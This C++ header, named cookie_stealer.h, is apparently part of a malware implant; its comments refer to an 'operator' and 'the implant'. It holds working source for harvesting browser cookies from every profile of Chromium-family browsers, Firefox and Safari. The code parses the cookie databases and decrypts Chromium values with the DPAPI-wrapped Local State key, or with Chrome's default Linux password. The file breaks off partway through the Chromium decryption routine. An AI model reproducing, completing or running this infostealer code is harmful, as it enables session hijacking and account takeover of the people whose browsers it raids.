#pragma once
// ============================================================================
//  cookie_stealer.h — browser cookie collection (cross-platform)
//  ─────────────────────────────────────────────────────────────────────────
//  Coverage is EVERY family, not just Chromium:
//
//   * Chromium family (Chrome, Edge, Brave, Chromium, Vivaldi, Opera, Opera
//     GX) on Windows, Linux and macOS — every profile, Network/ and legacy
//     top-level layouts;
//   * Gecko (Firefox, all channels + snap/flatpak) — cookies.sqlite values
//     are NOT encrypted, so they are recovered whole on every platform;
//   * Safari — Cookies.binarycookies on macOS, also plaintext.
//
//  A value the running context cannot unseal is REPORTED AS SUCH (with the
//  reason) instead of being emitted as a plausible-looking wrong value: a
//  silently corrupted session cookie wastes an operator's session and looks
//  like a bug in the implant.
// ============================================================================

#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <utility>
#include <iterator>
#include <cstring>
#include <cstdio>
#include <cstdint>
#include <cstdlib>
#include <cctype>
#include <ctime>
#include <algorithm>

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#else
#include <sys/stat.h>
#include <dirent.h>
// Capability detection, not a hard requirement: on macOS the Chromium key
// lives in the login Keychain and is not reachable from here, so the OpenSSL
// path is only useful on Linux. A build without OpenSSL headers must still
// compile — it simply reports sealed values as sealed.
#if defined(__linux__) && __has_include(<openssl/evp.h>)
#include <openssl/evp.h>
#define PHANTOM_COOKIE_HAVE_OPENSSL 1
#endif
#endif
#ifndef PHANTOM_COOKIE_HAVE_OPENSSL
#define PHANTOM_COOKIE_HAVE_OPENSSL 0
#endif

namespace cookie_stealer {

// ── SQLite page types ──────────────────────────────────────────────────────
constexpr unsigned char PAGE_TABLE_LEAF = 0x0D;
constexpr unsigned char PAGE_TABLE_INTERNAL = 0x05;

// Read varint from SQLite format, advance pointer
inline uint64_t read_varint(const unsigned char*& p) {
    uint64_t v = 0;
    for (int i = 0; i < 9; i++) {
        v = (v << 7) | (*p & 0x7F);
        if ((*p++ & 0x80) == 0) return v;
    }
    return v;
}

// Get byte offset within a page
inline uint16_t get_uint16(const unsigned char* p) {
    return (uint16_t)((p[0] << 8) | p[1]);
}

// Decode SQLite serial value into string.
//
// Serial types 1..6 are the INTEGER width classes and are rendered as
// DECIMAL TEXT like every other number. Returning the raw byte for type 1 (a
// one-byte integer — the `rootpage` of every schema row, `is_secure`, flags)
// made every numeric comparison against "1" fail and turned a schema lookup
// into a parse error.
inline std::string read_serial_value(const unsigned char*& data, uint64_t serialType) {
    if (serialType == 0) { return ""; }
    if (serialType == 1) {
        int8_t v = (int8_t)*data;
        data += 1;
        return std::to_string((int)v);
    }
    if (serialType == 2) {
        int16_t v = (int16_t)((data[0] << 8) | data[1]); data += 2;
        return std::to_string(v);
    }
    if (serialType == 3) {
        int32_t v = (int32_t)((data[0] << 16) | (data[1] << 8) | data[2]);
        if (v & 0x800000) v |= 0xFF000000;
        data += 3;
        return std::to_string(v);
    }
    if (serialType == 4) {
        int32_t v = (int32_t)((data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3]); data += 4;
        return std::to_string(v);
    }
    if (serialType == 5) {
        int64_t v = (int64_t)((int64_t)data[0] << 40) | ((int64_t)data[1] << 32) | ((int64_t)data[2] << 24) |
                    ((int64_t)data[3] << 16) | ((int64_t)data[4] << 8) | data[5];
        data += 6;
        return std::to_string(v);
    }
    if (serialType == 6) {
        int64_t v = ((int64_t)data[0] << 56) | ((int64_t)data[1] << 48) | ((int64_t)data[2] << 40) |
                    ((int64_t)data[3] << 32) | ((int64_t)data[4] << 24) | ((int64_t)data[5] << 16) |
                    ((int64_t)data[6] << 8) | (int64_t)data[7]; data += 8;
        return std::to_string(v);
    }
    if (serialType == 7) {
        data += 8; return "";
    }
    if (serialType >= 12 && (serialType % 2 == 0)) {
        size_t len = (size_t)((serialType - 12) / 2);
        std::string r((const char*)data, len); data += len;
        return r;
    }
    if (serialType >= 13 && (serialType % 2 == 1)) {
        size_t len = (size_t)((serialType - 13) / 2);
        std::string r((const char*)data, len); data += len;
        return r;
    }
    return "";
}

// ── Schema-aware reader ────────────────────────────────────────────────────
// Column names come from the table's own CREATE statement, so ONE engine
// reads Chromium's `cookies` and Firefox's `moz_cookies` (whose columns are
// in a different order) without a second hand-written parser.

inline size_t serial_size(uint64_t serialType) {
    if (serialType == 0) return 0;
    if (serialType == 1) return 1;
    if (serialType == 2) return 2;
    if (serialType == 3) return 3;
    if (serialType == 4) return 4;
    if (serialType == 5) return 6;
    if (serialType == 6 || serialType == 7) return 8;
    if (serialType >= 12 && (serialType % 2 == 0)) return (size_t)((serialType - 12) / 2);
    if (serialType >= 13 && (serialType % 2 == 1)) return (size_t)((serialType - 13) / 2);
    return 0;
}

struct Column {
    std::string name;
    std::string text;
    std::vector<unsigned char> blob;
};

struct Row {
    std::vector<Column> columns;

    const Column* find(const char* wanted) const {
        for (const auto& col : columns) {
            if (col.name == wanted) return &col;
        }
        return nullptr;
    }
    std::string text(const char* wanted) const {
        const Column* col = find(wanted);
        return col ? col->text : std::string();
    }
    std::vector<unsigned char> blob(const char* wanted) const {
        const Column* col = find(wanted);
        return col ? col->blob : std::vector<unsigned char>();
    }
};

struct Table {
    std::vector<std::string> columns;
    std::vector<Row> rows;
};

// Column names of a CREATE TABLE statement, in declared order.
inline std::vector<std::string> parse_columns(const std::string& sql) {
    std::vector<std::string> out;
    size_t open = sql.find('(');
    if (open == std::string::npos) return out;
    size_t depth = 0;
    std::string current;
    for (size_t i = open + 1; i < sql.size(); ++i) {
        char ch = sql[i];
        if (ch == '(') depth++;
        if (ch == ')') {
            if (depth == 0) break;
            depth--;
        }
        if (ch == ',' && depth == 0) {
            out.push_back(current);
            current.clear();
            continue;
        }
        current.push_back(ch);
    }
    if (!current.empty()) out.push_back(current);

    std::vector<std::string> names;
    for (std::string& raw : out) {
        size_t start = raw.find_first_not_of(" \t\r\n\"'`");
        if (start == std::string::npos) continue;
        size_t end = raw.find_first_of(" \t\r\n\"'`(", start);
        std::string name = raw.substr(start, end == std::string::npos
                                            ? std::string::npos : end - start);
        std::string upper = name;
        for (char& c : upper) c = (char)toupper((unsigned char)c);
        // Table-level constraints are not columns.
        if (upper == "PRIMARY" || upper == "UNIQUE" || upper == "CHECK" ||
            upper == "FOREIGN" || upper == "CONSTRAINT") {
            continue;
        }
        names.push_back(name);
    }
    return names;
}

// Walk one B-tree, handing every record to a callback as decoded serial
// types plus a pointer to the value area.
struct Record {
    std::vector<uint64_t> types;
    const unsigned char* values;
    const unsigned char* limit;
};

template <typename Handler>
inline void walk_btree(const std::vector<unsigned char>& db, unsigned pageSize,
                       unsigned pageCount, unsigned rootPage,
                       Handler on_record) {
    if (rootPage == 0 || rootPage > pageCount) return;
    std::vector<unsigned> stack(1, rootPage);
    std::vector<bool> seen(pageCount + 1, false);
    size_t budget = pageCount + 16;
    while (!stack.empty() && budget-- > 0) {
        unsigned pgNo = stack.back();
        stack.pop_back();
        if (pgNo == 0 || pgNo > pageCount || seen[pgNo]) continue;
        seen[pgNo] = true;
        // Two different origins on one page: the B-tree HEADER of page 1 sits
        // after the 100-byte file header, while every cell pointer stays
        // relative to the START OF THE PAGE (SQLite: "the beginning of the
        // page"). Mixing the two reads a cell in the middle of another row.
        size_t pageStart = (size_t)(pgNo - 1) * pageSize;
        size_t base = pageStart + (pgNo == 1 ? 100u : 0u);
        if (base + 12 > db.size()) continue;
        unsigned char pageType = db[base];
        if (pageType != PAGE_TABLE_LEAF && pageType != PAGE_TABLE_INTERNAL) continue;
        unsigned short cellCount = get_uint16(db.data() + base + 3);
        size_t tableStart = base + (pageType == PAGE_TABLE_INTERNAL ? 12u : 8u);
        if (tableStart + (size_t)cellCount * 2 > db.size()) continue;

        if (pageType == PAGE_TABLE_INTERNAL) {
            unsigned rightChild = get_uint16(db.data() + base + 8);
            for (int i = 0; i < cellCount; ++i) {
                unsigned short cellOff = get_uint16(db.data() + tableStart + i * 2);
                if (pageStart + cellOff + 4 > db.size()) continue;
                stack.push_back(get_uint16(db.data() + pageStart + cellOff));
            }
            if (rightChild) stack.push_back(rightChild);
            continue;
        }

        for (int i = 0; i < cellCount; ++i) {
            unsigned short cellOff = get_uint16(db.data() + tableStart + i * 2);
            if (cellOff == 0 || pageStart + cellOff + 2 > db.size()) continue;
            const unsigned char* cell = db.data() + pageStart + cellOff;
            const unsigned char* limit = db.data() + db.size();
            (void)read_varint(cell);                 // payload length
            (void)read_varint(cell);                 // rowid
            if (cell >= limit) continue;
            const unsigned char* record = cell;
            uint64_t headerSize = read_varint(cell);
            const unsigned char* headerEnd = record + headerSize;
            if (headerEnd > limit) continue;
            Record rec;
            rec.values = headerEnd;
            rec.limit = limit;
            while (cell < headerEnd && rec.types.size() < 64) {
                rec.types.push_back(read_varint(cell));
            }
            on_record(rec);
        }
    }
}

// Collect every record of one table, mapped onto the column names declared in
// its CREATE statement — which is what lets ONE engine read Chromium and
// Gecko tables whose columns are in a different order.
inline Table read_table(const std::vector<unsigned char>& db,
                        const std::string& table_name) {
    Table table;
    if (db.size() < 100) return table;

    unsigned short pageSizeShort = (unsigned short)((db[16] << 8) | db[17]);
    unsigned pageSize = pageSizeShort == 1 ? 65536u : (unsigned)pageSizeShort;
    if (pageSize < 512) return table;
    unsigned pageCount = (unsigned)(db.size() / pageSize);
    if (pageCount < 1) return table;

    // Pass 1: sqlite_master (page 1) holds (type, name, tbl_name, rootpage,
    // sql) and tells us both the root page and the column order.
    unsigned rootPage = 0;
    std::vector<std::string> columns;
    walk_btree(db, pageSize, pageCount, 1, [&](const Record& rec) {
        if (rec.types.size() < 5) return;
        const unsigned char* vp = rec.values;
        std::vector<std::string> cols;
        for (uint64_t type : rec.types) {
            size_t size = serial_size(type);
            if (vp + size > rec.limit) return;
            cols.push_back(read_serial_value(vp, type));
        }
        if (cols[0] != "table" || cols[1] != table_name) return;
        if (cols[3].empty()) return;
        rootPage = (unsigned)std::strtoul(cols[3].c_str(), nullptr, 10);
        columns = parse_columns(cols[4]);
    });
    if (rootPage == 0 || columns.empty()) return table;

    // Pass 2: the table itself. SQLite does NOT store trailing NULLs, so a
    // record is routinely shorter than the column list — mapping only the
    // stored prefix is correct, and demanding an exact match would silently
    // drop most real rows (browsers leave columns at their defaults).
    walk_btree(db, pageSize, pageCount, rootPage, [&](const Record& rec) {
        Row row;
        size_t stored = std::min(rec.types.size(), columns.size());
        const unsigned char* vp = rec.values;
        for (size_t ci = 0; ci < stored; ++ci) {
            size_t size = serial_size(rec.types[ci]);
            if (vp + size > rec.limit) return;
            Column col;
            col.name = columns[ci];
            if (rec.types[ci] >= 12 && rec.types[ci] % 2 == 0) {
                col.blob.assign(vp, vp + size);
                vp += size;
            } else {
                col.text = read_serial_value(vp, rec.types[ci]);
            }
            row.columns.push_back(col);
        }
        table.rows.push_back(row);
    });
    table.columns = columns;
    return table;
}

// ── Cookie model ───────────────────────────────────────────────────────────

struct Cookie {
    std::string browser;
    std::string profile;
    std::string host;
    std::string name;
    std::string path;
    std::string value;
    std::string sealed_reason;   // non-empty when the value could not be read
    bool has_expires = false;
    int64_t expires_utc = 0;
};

inline std::string lowercase(const std::string& value) {
    std::string out = value;
    std::transform(out.begin(), out.end(), out.begin(),
                   [](unsigned char c) { return (char)tolower(c); });
    return out;
}

// Gecko `moz_cookies`: values are stored in the CLEAR, no OS keystore
// involved — which is why Firefox works on every platform.
inline std::vector<Cookie> gecko_rows_to_cookies(const Table& table,
                                                 const std::string& profile) {
    std::vector<Cookie> out;
    for (const Row& row : table.rows) {
        std::string name = row.text("name");
        std::string value = row.text("value");
        if (name.empty() || value.empty()) continue;
        Cookie cookie;
        cookie.browser = "firefox";
        cookie.profile = profile;
        cookie.host = lowercase(row.text("host"));
        cookie.name = name;
        cookie.path = row.text("path").empty() ? "/" : row.text("path");
        cookie.value = value;
        // Firefox stores expiry in UNIX seconds; normalise to the Chromium
        // epoch (100ns since 1601) so one formatter serves every browser.
        std::string expiry = row.text("expiry");
        if (!expiry.empty()) {
            long long seconds = std::atoll(expiry.c_str());
            if (seconds > 0) {
                cookie.has_expires = true;
                cookie.expires_utc = seconds * 1000000LL + 11644473600000000LL;
            }
        }
        out.push_back(cookie);
    }
    return out;
}

// ── Safari Cookies.binarycookies ──────────────────────────────────────────

inline uint32_t bc_u32le(const unsigned char* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
           ((uint32_t)p[3] << 24);
}

inline uint32_t bc_u32be(const unsigned char* p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) |
           (uint32_t)p[3];
}

inline std::string bc_string(const std::vector<unsigned char>& record, size_t at) {
    if (at == 0 || at >= record.size()) return std::string();
    size_t end = at;
    while (end < record.size() && record[end] != 0) ++end;
    return std::string((const char*)record.data() + at, end - at);
}

inline std::string host_of_url(const std::string& url) {
    std::string value = lowercase(url);
    size_t scheme = value.find("://");
    if (scheme != std::string::npos) value = value.substr(scheme + 3);
    size_t slash = value.find('/');
    if (slash != std::string::npos) value = value.substr(0, slash);
    size_t colon = value.find(':');
    if (colon != std::string::npos) value = value.substr(0, colon);
    return value;
}

inline std::vector<Cookie> safari_cookies(const std::vector<unsigned char>& db) {
    std::vector<Cookie> out;
    if (db.size() < 16 || std::memcmp(db.data(), "cookies", 7) != 0) return out;
    if (db[7] != 0x00) return out;                 // only big-endian pages
    uint32_t pages = bc_u32be(db.data() + 8);
    if (pages == 0 || pages > 4096) return out;
    if (12 + (size_t)pages * 4 > db.size()) return out;

    size_t offset = 12 + (size_t)pages * 4;
    for (uint32_t page = 0; page < pages; ++page) {
        uint32_t size = bc_u32be(db.data() + 12 + page * 4);
        if (offset + size > db.size()) return out;
        const unsigned char* pageData = db.data() + offset;
        if (size < 8) { offset += size; continue; }
        uint32_t count = bc_u32le(pageData + 4);
        if (count == 0 || 8 + (size_t)count * 4 > size) { offset += size; continue; }
        for (uint32_t index = 0; index < count; ++index) {
            uint32_t recordOff = bc_u32le(pageData + 8 + index * 4);
            if (recordOff == 0 || (size_t)recordOff + 56 > size) continue;
            uint32_t recordSize = bc_u32le(pageData + recordOff);
            if (recordSize == 0 || (size_t)recordOff + recordSize > size) continue;
            std::vector<unsigned char> record(
                pageData + recordOff, pageData + recordOff + recordSize);
            std::string name = bc_string(record, bc_u32le(record.data() + 20));
            if (name.empty()) continue;
            Cookie cookie;
            cookie.browser = "safari";
            cookie.profile = "Default";
            cookie.host = host_of_url(bc_string(record, bc_u32le(record.data() + 16)));
            cookie.name = name;
            cookie.path = bc_string(record, bc_u32le(record.data() + 24));
            if (cookie.path.empty()) cookie.path = "/";
            cookie.value = bc_string(record, bc_u32le(record.data() + 28));
            if (cookie.value.empty()) continue;
            out.push_back(cookie);
        }
        offset += size;
    }
    return out;
}

// ── platform glue ──────────────────────────────────────────────────────────

inline bool read_file(const std::string& path, std::vector<unsigned char>& out) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return false;
    out.assign(std::istreambuf_iterator<char>(file),
               std::istreambuf_iterator<char>());
    return !out.empty();
}

inline bool is_dir(const std::string& path) {
#ifdef _WIN32
    DWORD attrs = GetFileAttributesA(path.c_str());
    return attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY);
#else
    struct stat info;
    return stat(path.c_str(), &info) == 0 && S_ISDIR(info.st_mode);
#endif
}

inline bool is_file(const std::string& path) {
#ifdef _WIN32
    DWORD attrs = GetFileAttributesA(path.c_str());
    return attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
#else
    struct stat info;
    return stat(path.c_str(), &info) == 0 && S_ISREG(info.st_mode);
#endif
}

inline std::string env_or_empty(const char* name) {
    const char* value = getenv(name);
    return value ? std::string(value) : std::string();
}

#ifdef _WIN32
inline constexpr char PATH_SEP = '\\';
#else
inline constexpr char PATH_SEP = '/';
#endif

inline std::string join(const std::string& base, const std::string& part) {
    if (base.empty()) return part;
    if (part.empty()) return base;
    char last = base[base.size() - 1];
    if (last == '/' || last == '\\') return base + part;
    return base + PATH_SEP + part;
}

struct Target {
    std::string family;    // "chromium" | "gecko" | "safari"
    std::string browser;
    std::string profile;
    std::string db_path;
    std::string user_data; // Chromium only: holds `Local State`
};

inline std::vector<std::pair<std::string, std::string> > user_data_roots() {
    std::vector<std::pair<std::string, std::string> > roots;
    const char* home = getenv("HOME");
    const char* local = getenv("LOCALAPPDATA");
    const char* roaming = getenv("APPDATA");
    std::string h = home ? home : "";
    std::string l = local ? local : "";
    std::string r = roaming ? roaming : "";

    if (!l.empty()) {
        roots.push_back(std::make_pair("chrome", join(join(join(l, "Google"), "Chrome"), "User Data")));
        roots.push_back(std::make_pair("edge", join(join(join(l, "Microsoft"), "Edge"), "User Data")));
        roots.push_back(std::make_pair("brave", join(join(join(l, "BraveSoftware"), "Brave-Browser"), "User Data")));
        roots.push_back(std::make_pair("chromium", join(join(l, "Chromium"), "User Data")));
        roots.push_back(std::make_pair("vivaldi", join(join(l, "Vivaldi"), "User Data")));
    }
    if (!r.empty()) {
        roots.push_back(std::make_pair("opera", join(join(r, "Opera Software"), "Opera Stable")));
        roots.push_back(std::make_pair("opera-gx", join(join(r, "Opera Software"), "Opera GX Stable")));
    }
    if (!h.empty()) {
        // macOS
        std::string support = join(join(h, "Library"), "Application Support");
        roots.push_back(std::make_pair("chrome", join(join(support, "Google"), "Chrome")));
        roots.push_back(std::make_pair("chrome-canary", join(join(support, "Google"), "Chrome Canary")));
        roots.push_back(std::make_pair("edge", join(support, "Microsoft Edge")));
        roots.push_back(std::make_pair("brave", join(join(support, "BraveSoftware"), "Brave-Browser")));
        roots.push_back(std::make_pair("chromium", join(support, "Chromium")));
        roots.push_back(std::make_pair("vivaldi", join(support, "Vivaldi")));
        roots.push_back(std::make_pair("opera", join(join(support, "Opera Software"), "Opera Stable")));
        roots.push_back(std::make_pair("opera-gx", join(join(support, "Opera Software"), "Opera GX Stable")));
        // Linux
        std::string config = join(h, ".config");
        const char* linux_dirs[] = {
            "google-chrome", "google-chrome-beta", "google-chrome-unstable",
            "chromium", "brave-browser", "microsoft-edge", "vivaldi",
            "opera", "opera-gx",
        };
        for (const char* dir : linux_dirs) {
            roots.push_back(std::make_pair(std::string(dir), join(config, dir)));
        }
    }
    return roots;
}

// Every profile of every installed Chromium-family browser.
inline std::vector<Target> chromium_targets() {
    std::vector<Target> out;
    for (const auto& root : user_data_roots()) {
        if (!is_dir(root.second)) continue;
        std::vector<std::string> profiles;
        bool opera = root.second.find("Opera") != std::string::npos;
        if (opera) profiles.push_back("");
        profiles.push_back("Default");
        // Profile 1..N and `Profile 1..N` — enumerate what is actually there.
        std::vector<std::string> entries;
#ifdef _WIN32
        WIN32_FIND_DATAA data;
        HANDLE handle = FindFirstFileA(join(root.second, "*").c_str(), &data);
        if (handle != INVALID_HANDLE_VALUE) {
            do {
                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    entries.push_back(data.cFileName);
                }
            } while (FindNextFileA(handle, &data));
            FindClose(handle);
        }
#else
        DIR* dir = opendir(root.second.c_str());
        if (dir) {
            struct dirent* entry;
            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_name[0] == '.') continue;
                if (is_dir(join(root.second, entry->d_name))) {
                    entries.push_back(entry->d_name);
                }
            }
            closedir(dir);
        }
#endif
        for (const std::string& entry : entries) {
            if (entry == "Default" || entry.compare(0, 8, "Profile ") == 0) {
                profiles.push_back(entry);
            }
        }
        std::sort(profiles.begin(), profiles.end());
        profiles.erase(std::unique(profiles.begin(), profiles.end()), profiles.end());

        for (const std::string& profile : profiles) {
            std::string base = profile.empty() ? root.second
                                               : join(root.second, profile);
            std::string network = join(join(base, "Network"), "Cookies");
            std::string legacy = join(base, "Cookies");
            Target target;
            target.family = "chromium";
            target.browser = root.first;
            target.profile = profile.empty() ? "Default" : profile;
            target.user_data = root.second;
            if (is_file(network)) {
                target.db_path = network;
                out.push_back(target);
            } else if (is_file(legacy)) {
                target.db_path = legacy;
                out.push_back(target);
            }
        }
    }
    return out;
}

// Firefox profiles: plaintext cookies, every platform and every packaging.
inline std::vector<Target> gecko_targets() {
    std::vector<Target> out;
    std::string home = env_or_empty("HOME");
    std::string roaming = env_or_empty("APPDATA");
    std::vector<std::string> roots;
    if (!roaming.empty()) {
        roots.push_back(join(join(join(roaming, "Mozilla"), "Firefox"), "Profiles"));
    }
    if (!home.empty()) {
        roots.push_back(join(join(join(join(home, "Library"), "Application Support"),
                                   "Firefox"), "Profiles"));
        roots.push_back(join(join(home, ".mozilla"), "firefox"));
        roots.push_back(join(join(join(join(join(home, "snap"), "firefox"), "common"),
                                   ".mozilla"), "firefox"));
        roots.push_back(join(join(join(join(join(home, ".var"), "app"),
                                       "org.mozilla.firefox"), ".mozilla"), "firefox"));
        roots.push_back(join(home, ".librewolf"));
        roots.push_back(join(home, ".waterfox"));
    }
    for (const std::string& root : roots) {
        if (!is_dir(root)) continue;
        std::vector<std::string> profiles;
#ifdef _WIN32
        WIN32_FIND_DATAA data;
        HANDLE handle = FindFirstFileA(join(root, "*").c_str(), &data);
        if (handle != INVALID_HANDLE_VALUE) {
            do {
                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    profiles.push_back(data.cFileName);
                }
            } while (FindNextFileA(handle, &data));
            FindClose(handle);
        }
#else
        DIR* dir = opendir(root.c_str());
        if (dir) {
            struct dirent* entry;
            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_name[0] == '.') continue;
                profiles.push_back(entry->d_name);
            }
            closedir(dir);
        }
#endif
        for (const std::string& profile : profiles) {
            std::string db = join(join(root, profile), "cookies.sqlite");
            if (!is_file(db)) continue;
            Target target;
            target.family = "gecko";
            target.browser = "firefox";
            target.profile = profile;
            target.db_path = db;
            out.push_back(target);
        }
    }
    return out;
}

inline std::vector<Target> safari_targets() {
    std::vector<Target> out;
    std::string home = env_or_empty("HOME");
    if (home.empty()) return out;
    const std::string paths[] = {
        join(join(join(home, "Library"), "Cookies"), "Cookies.binarycookies"),
        join(join(join(join(join(join(join(join(home, "Library"), "Containers"),
                                          "com.apple.Safari"), "Data"), "Library"),
                              "Cookies"), ""), "Cookies.binarycookies"),
    };
    for (const std::string& path : paths) {
        if (!is_file(path)) continue;
        Target target;
        target.family = "safari";
        target.browser = "safari";
        target.profile = "Default";
        target.db_path = path;
        out.push_back(target);
    }
    return out;
}

// ── unsealing ──────────────────────────────────────────────────────────────

#if PHANTOM_COOKIE_HAVE_OPENSSL
// Linux Chromium has no AEAD variant: b"v10"/b"v11" blobs are AES-128-CBC
// with IV = 16 spaces, keyed by PBKDF2-HMAC-SHA1(password, "saltysalt"). With
// no keyring in reach Chrome itself falls back to the literal password
// "peanuts" (one round) — the only case recoverable without the user's
// keyring. EVP_DecryptFinal_ex validates the PKCS#7 padding, so a key that
// does not fit yields NO value instead of a plausible-looking wrong one.
inline bool linux_oscrypt_open(const unsigned char* blob, size_t length,
                               std::vector<unsigned char>& out) {
    if (length == 0) return false;
    unsigned char key[16];
    if (PKCS5_PBKDF2_HMAC("peanuts", 7, (const unsigned char*)"saltysalt", 9,
                          1, EVP_sha1(), 16, key) != 1) {
        return false;
    }
    unsigned char iv[16];
    std::memset(iv, 0x20, sizeof(iv));
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    bool ok = false;
    do {
        if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr, key, iv)) break;
        std::vector<unsigned char> plain(length + 16);
        int written = 0;
        int total = 0;
        if (1 != EVP_DecryptUpdate(ctx, plain.data(), &written, blob,
                                   (int)length)) break;
        total = written;
        if (1 != EVP_DecryptFinal_ex(ctx, plain.data() + total, &written)) break;
        total += written;
        plain.resize((size_t)total);
        out = plain;
        ok = true;
    } while (0);
    EVP_CIPHER_CTX_free(ctx);
    return ok;
}
#endif

#ifdef _WIN32

inline bool dpapi_unprotect(const std::vector<unsigned char>& blob,
                            std::vector<unsigned char>& out) {
    if (blob.empty()) return false;
    DATA_BLOB in{};
    in.pbData = const_cast<BYTE*>(blob.data());
    in.cbData = (DWORD)blob.size();
    DATA_BLOB outBlob{};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        return false;
    }
    out.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return true;
}

inline std::string base64_decode_text(const std::string& value) {
    static const std::string alphabet =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int buffer = 0, bits = 0;
    for (char ch : value) {
        if (ch == '=') break;
        size_t index = alphabet.find(ch);
        if (index == std::string::npos) continue;
        buffer = (buffer << 6) | (int)index;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back((char)((buffer >> bits) & 0xFF));
        }
    }
    return out;
}

// AES-256-GCM open for Chrome's b"v10" layout (nonce || ct || tag).
inline bool aes_gcm_open(const unsigned char* key, size_t keyLen,
                         const unsigned char* nonce, size_t nonceLen,
                         const unsigned char* tag, size_t tagLen,
                         const unsigned char* ct, size_t ctLen,
                         std::vector<unsigned char>& out) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM,
                                                  nullptr, 0);
    if (!NT_SUCCESS(status)) return false;
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                               (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (NT_SUCCESS(status)) {
        status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
                                           (PUCHAR)key, (ULONG)keyLen, 0);
    }
    bool ok = false;
    if (NT_SUCCESS(status)) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = const_cast<PUCHAR>(nonce);
        info.cbNonce = (ULONG)nonceLen;
        info.pbTag = const_cast<PUCHAR>(tag);
        info.cbTag = (ULONG)tagLen;
        std::vector<unsigned char> plain(ctLen ? ctLen : 1);
        ULONG produced = 0;
        status = BCryptDecrypt(hKey, const_cast<PUCHAR>(ct), (ULONG)ctLen, &info,
                               nullptr, 0, plain.data(), (ULONG)plain.size(),
                               &produced, 0);
        if (NT_SUCCESS(status)) {
            plain.resize(produced);
            out = plain;
            ok = true;
        }
    }
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

// The AES key a Chromium profile sealed its cookies with: DPAPI-wrapped in
// the profile's own `Local State` (users) — no browser identity needed.
inline std::vector<unsigned char> local_state_key(const std::string& user_data) {
    std::vector<unsigned char> raw;
    if (!read_file(join(user_data, "Local State"), raw)) return {};
    std::string text(raw.begin(), raw.end());
    size_t at = text.find("\"encrypted_key\"");
    if (at == std::string::npos) return {};
    size_t colon = text.find(':', at);
    size_t open = text.find('"', colon + 1);
    if (colon == std::string::npos || open == std::string::npos) return {};
    size_t close = text.find('"', open + 1);
    if (close == std::string::npos) return {};
    std::string decoded = base64_decode_text(text.substr(open + 1, close - open - 1));
    if (decoded.size() < 6 || decoded.compare(0, 5, "DPAPI") != 0) return {};
    std::vector<unsigned char> blob(decoded.begin() + 5, decoded.end());
    std::vector<unsigned char> key;
    if (!dpapi_unprotect(blob, key)) return {};
    return key;
}

inline std::vector<Cookie> unseal_chromium(const std::vector<unsigned char>& db,
                                           const std::string& browser,
                                           const std::string& profile,
                                           const std::string& user_data) {
    Table table = read_table(db, "cookies");
    std::vector<unsigned char> key = local_state_key(user_data);
    std::vector<Cookie> out;
    for (const Row& row : table.rows) {
        std::string name = row.text("name");
        if (name.empty()) continue;
        Cookie cookie;
        cookie.browser = browser;
        cookie.profile = profile;
        cookie.host = lowercase(row.text("host_key"));
        cookie.name = name;
        cookie.path = row.text("path");
        if (cookie.path.empty()) cookie.path = "/";
        cookie.value = row.text("value");
        std::string expires = row.text("expires_utc");
        if (!expires.empty()) {
            cookie.has_expires = true;
            cookie.expires_utc = std::atoll(expires.c_str());
        }
        if (cookie.value.empty()) {
            std::vector<unsigned char> blob = row.blob("encrypted_value");
            if (!blob.empty()) {
                if (blob.size() > 3 && std::memcmp(blob.data(), "v20", 3) == 0) {
                    cookie.sealed_reason = "app-bound (v20)";
                } else if (blob.size() > 31 && (std::memcmp(blob.data(), "v10", 3) == 0 ||
                                                std::memcmp(blob.data(), "v11", 3) == 0)) {
                    if (key.size() == 32) {
                        std::vector<unsigned char> plain;
                        size_t body = blob.size() - 3 - 12 - 16;
                        if (aes_gcm_open(key.data(), key.size(), blob.data() + 3, 12,
                                         blob.data() + blob.size() - 16, 16,
                                         blob.data() + 15, body, plain)) {
                            cookie.value.assign(plain.begin(), plain.end());
                        } else {
                            cookie.sealed_reason = "gcm failed";
                        }
                    } else {
                        cookie.sealed_reason = "no Local State key";
                    }
                } else {
                    std::vector<unsigned char> plain;
                    if (dpapi_unprotect(blob, plain)) {
                        cookie.value.assign(plain.begin(), plain.end());
                    } else {
                        cookie.sealed_reason = "dpapi failed";
                    }
                }
            }
        }
